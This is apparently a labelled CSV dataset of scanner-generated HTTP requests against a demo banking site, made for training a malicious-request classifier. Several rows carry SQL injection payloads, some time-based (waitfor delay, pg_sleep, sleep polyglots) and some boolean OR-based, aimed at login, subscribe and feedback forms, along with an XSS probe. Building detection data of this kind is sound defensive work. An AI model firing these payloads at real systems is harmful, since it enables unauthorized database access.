method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/swagger/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=kji4TgVC';%20waitfor%20delay%20'0:0:9'%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,3,0,1,0,7,2,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=L1U2BuZ4'));select%20pg_sleep(3);%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,1,0,1,1,5,2,bad
GET,/swagger/1%c0%00xa7%c0%a2.html,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,"/high_yield_investments.htm?wvstest=javascript:domxssExecutionSink(1,%22%3Cbr%3E()locxss%22)&",,0,2,0,2,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=71zjw9wF'));select%20pg_sleep(3);%20--%20&name=xmsktkqj&subject=1&submit=Submit,1,0,1,1,3,2,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp?HostName=%f0''%f0%22%22,,2,2,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=%bf'%bf%22,,1,1,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/,2,2,0,15,0,9,bad
GET,/swagger/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=-1%22%20OR%202%2b334-334-1%3d0%2b0%2b0%2b1%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,0,1,1,0,6,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
POST,/doSubscribe,btnSubmit=%bf'%bf%22&txtEmail=sample%40email.tst,1,1,0,0,0,0,bad
POST,/doLogin,btnSubmit=-1'%20OR%202%2b196-196-1%3d0%2b0%2b0%2b1%20--%20&passw=g00dPa%24%24w0rD&uid=1,1,0,1,0,4,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_cards.htm,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/index.jsp?content=personal_loans.htm'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'Qf4b'%3d'Qf4b,,4,0,0,0,4,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=58UuwArJ';%20waitfor%20delay%20'0:0:3'%20--%20&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,3,0,1,0,7,2,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/default.jsp?content=051DYQ1H'));%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,bad
GET,/altoro,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/search.jsp?query=1%c0%00xa7%c0%a2,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/util/serverStatusCheckService.jsp?HostName=LZMuOqZ4,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=-1'%20OR%202%2b407-407-1%3d0%2b0%2b0%2b1%20--%20&subject=1&submit=Submit,1,0,1,0,6,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%22%20OR%202%2b129-129-1%3d0%2b0%2b0%2b1%20--%20,0,1,1,0,4,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=a,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=%5c&submit=Submit,0,0,0,0,2,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=%5c&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1&submit=Submit,0,0,0,0,2,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/swagger/LYkUrXya';select%20pg_sleep(9);%20--%20.html,,1,0,1,1,3,2,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp?content=NOeXZqTQ';%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/TdFzqg56,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/search.jsp?query=%f0''%f0%22%22,,2,2,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=b'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'XneQ'%3d'XneQ,,4,0,0,0,4,0,bad
GET,/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=-1'%20OR%203%2b915-915-1%3d0%2b0%2b0%2b1%20--%20&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,1,0,1,0,6,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/swagger/cPlKa1La');%20waitfor%20delay%20'0:0:6'%20--%20.html,,3,0,1,0,5,2,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/&passw=g00dPa%24%24w0rD&uid=1,2,2,0,14,0,4,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=-1));%20waitfor%20delay%20'0:0:3'%20--%20&submit=Submit,2,0,1,0,7,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);select%20pg_sleep(6);%20--%20,0,0,1,1,3,3,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,0,0,0,0,2,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1&submit=1%c0%00xa7%c0%a2,0,0,0,0,2,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=-1'%20OR%202%2b52-52-1%3d0%2b0%2b0%2b1%20--%20&txtEmail=sample%40email.tst,1,0,1,0,4,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/index.jsp?content=1%c0%00xa7%c0%a2,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/images/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=2F8FUE07';select%20pg_sleep(9);%20--%20&name=xmsktkqj&subject=1&submit=Submit,1,0,1,1,3,2,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/high_yield_investments.htm,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=FQMMTLge');%20waitfor%20delay%20'0:0:6'%20--%20&submit=Submit,3,0,1,0,7,2,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
POST,/doLogin,btnSubmit=wTbzCM5C';%20waitfor%20delay%20'0:0:6'%20--%20&passw=g00dPa%24%24w0rD&uid=1,3,0,1,0,5,3,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/search.jsp?query=tVxRjnxV'));%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/index.jsp?content=%bf'%bf%22,,1,1,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/default.jsp?content=security.htm,,0,0,0,0,0,0,bad
GET,/search.jsp?query=JyI%3d,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%bf'%bf%22,1,1,0,0,0,1,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
